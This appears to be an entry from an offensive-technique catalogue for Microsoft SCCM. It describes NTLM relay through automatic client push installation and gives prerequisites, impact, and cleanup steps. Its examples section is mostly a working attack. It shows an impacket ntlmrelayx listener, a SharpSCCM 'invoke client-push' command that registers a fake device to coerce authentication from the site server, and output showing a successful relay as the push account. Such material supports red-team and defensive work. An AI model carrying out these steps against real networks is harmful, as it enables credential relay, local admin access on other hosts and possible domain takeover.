# ELEVATE-2

## Description
NTLM relay via automatic client push installation

## MITRE ATT&CK Tactics
- Lateral Movement
- Privilege Escalation

## Requirements
- Valid Active Directory domain credentials
- Connectivity to HTTPS (TCP/443) on a management point
- Connectivity from the primary site server to SMB (TCP/445) on the relay server
- Connectivity from the relay server to SMB (TCP/445) on the relay target
- Primary site server settings:
    - Automatic site-wide client push installation is enabled
    - Automatic site assignment is enabled
    - `Allow connection fallback to NTLM` is enabled for client push installation
    - PKI certificates are not required for client authentication
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictNTLMInDomain` = `0` or not present, or = `X` and `DCAllowedNTLMServers` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0` or not present, or = `1` and `ClientAllowedNTLMServers` contains attacker relay server
- Relay target settings:
    - `RequireSecuritySignature` = `0` or not present
    - `RestrictNTLMInDomain` = `0` or not present, or = `X` and `DCAllowedNTLMServers` contains attacker relay server
    - `RestrictReceivingNTLMTraffic` = `0` or not present, or = `1` and `X` contains attacker relay server

## Summary
When SCCM automatic site assignment and automatic client push installation are enabled, and PKI certificates aren’t required for client authentication, it’s possible to coerce NTLM authentication from the site server's installation and machine accounts to an arbitrary NetBIOS name, FQDN, or IP address, allowing the credentials to be relayed or cracked. This can be done using a low-privileged domain account on any Windows system.

## Impact
Client push installation accounts require local admin privileges to install software on systems in an SCCM site, so it is often possible to relay the credentials and execute actions in the context of a local admin on other SCCM clients in the site. Many organizations use a member of highly privileged groups such as Domain Admins for client push installation for the sake of convenience.

If all configured accounts fail when the site server tries to authenticate to a system to install the client, or if no specific installation accounts are configured, the server tries to authenticate with its machine account. If SMB is used, TAKEOVER-1 and TAKEOVER-2 may be possible. If the WebClient (WebDAV) service is enabled on the site server, it is possible to coerce NTLM authentication via HTTP, allowing relay to LDAP or HTTP to conduct attacks such as Shadow Credentials, Resource-based Constrained Delegation, or AD CS ESC8 to take over the server.

## Defensive IDs


## Examples

It is not possible to identify whether automatic site-wide client push installation, automatic site assignment, and `Allow connection fallback to NTLM` are enabled without attempting this attack.

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the relay target and the SMB service:

```
# impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t <RELAY_TARGET_IP>
Impacket v0.11.0 - Copyright 2023 Fortra

[2024-02-26 15:49:48] [*] Protocol Client MSSQL loaded..
[2024-02-26 15:49:48] [*] Protocol Client LDAPS loaded..
[2024-02-26 15:49:48] [*] Protocol Client LDAP loaded..
[2024-02-26 15:49:48] [*] Protocol Client RPC loaded..
[2024-02-26 15:49:48] [*] Protocol Client HTTPS loaded..
[2024-02-26 15:49:48] [*] Protocol Client HTTP loaded..
[2024-02-26 15:49:48] [*] Protocol Client IMAPS loaded..
[2024-02-26 15:49:48] [*] Protocol Client IMAP loaded..
[2024-02-26 15:49:48] [*] Protocol Client SMTP loaded..
[2024-02-26 15:49:48] [*] Protocol Client SMB loaded..
[2024-02-26 15:49:48] [*] Protocol Client DCSYNC loaded..
[2024-02-26 15:49:50] [*] Running in relay mode to single host
[2024-02-26 15:49:50] [*] Setting up SMB Server
[2024-02-26 15:49:50] [*] Setting up HTTP Server on port 80
[2024-02-26 15:49:50] [*] Setting up WCF Server
[2024-02-26 15:49:50] [*] Setting up RAW Server on port 6666

[2024-02-26 15:49:50] [*] Servers started, waiting for connections
```

2. Use SharpSCCM's `invoke client-push` function to register a new device with the management point and send a DDR to initiate automatic client push installation to your relay server running ntlmrelayx:

```
SharpSCCM.exe invoke client-push -sms <MANAGEMENT_POINT> -sc <SITECODE> -t <NTLMRELAYX_LISTENER_IP>

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
[+] Reusable Base64-encoded certificate:

    308209D2...020207D0

[+] Discovering local properties for client registration request
[+] Modifying client registration request properties:
      FQDN: <NTLMRELAYX_LISTENER_IP>
      NetBIOS name: <NTLMRELAYX_LISTENER_IP>
      Site code: <SITECODE>
[+] Sending HTTP registration request to <MANAGEMENT_POINT>:80
[+] Received unique SMS client GUID for new device:

    GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C

[+] Discovering local properties for DDR inventory report
[+] Modifying DDR and inventory report properties
[+] Discovered PlatformID: Microsoft Windows NT Server 10.0
[+] Modified PlatformID: Microsoft Windows NT Workstation 2010.0
[+] Sending DDR from GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C to MP_DdrEndpoint endpoint on <MANAGEMENT_POINT>:<SITECODE> and requesting client installation on <NTLMRELAYX_LISTENER_IP>
[+] Completed execution in 00:00:16.1952455
```

3. After a few minutes, ntlmrelayx should receive a connection from the configured client push installation account(s) and the site server’s machine account:
```
[2024-02-26 16:19:47] [*] SMBD-Thread-5 (process_request_thread): Received connection from <SITE_SERVER>, attacking target smb://<RELAY_TARGET>
[2024-02-26 16:19:48] [*] Authenticating against smb://<RELAY_TARGET> as MAYYHEM/CLIENTPUSH SUCCEED
```

Note: Sometimes, this command results in a client device record being created, but SCCM does not kick off automatic client push installation right away. Running the same command again should kick off the process.

### Cleanup
It is not possible to remotely delete device records or remove CCRs in the retry queue that are created by heartbeat DDRs without having Full Administrator privileges to SCCM. By default, the site will retry client push installation every 60 minutes for 7 days, and if a newly discovered device sits in the client push installation retry queue for more than 24 hours, an error message may be displayed in the console to administrators.

With Full Administrator access to SCCM, artifacts created by SharpSCCM that cause client push installation retries can be removed from the site server and database through the administration console or using SharpSCCM.

The following command can be used to identify the device's ResourceId:

```
SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
[+] Executing WQL query: SELECT ResourceId,Name,SMSUniqueIdentifier FROM SMS_R_System WHERE Name LIKE '%<NTLMRELAYX_LISTENER_IP>%'
-----------------------------------
SMS_R_System
-----------------------------------
Name: <NTLMRELAYX_LISTENER_IP>
ResourceId: 16777236
SMSUniqueIdentifier: GUID:593FA39D-B6C6-4B8F-A4DE-2454503116FC
-----------------------------------
Name: <NTLMRELAYX_LISTENER_IP>
ResourceId: 16777237
SMSUniqueIdentifier: GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
-----------------------------------
```

The following command can be used to remove a device with a specified GUID:

```
SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
[+] Deleted device with SMSUniqueIdentifier GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
[+] Completed execution in 00:00:01.8554465
```

## References
- Chris Thompson, Coercing NTLM Authentication from SCCM Servers, https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a
- Chris Thompson, SharpSCCM, https://github.com/Mayyhem/SharpSCCM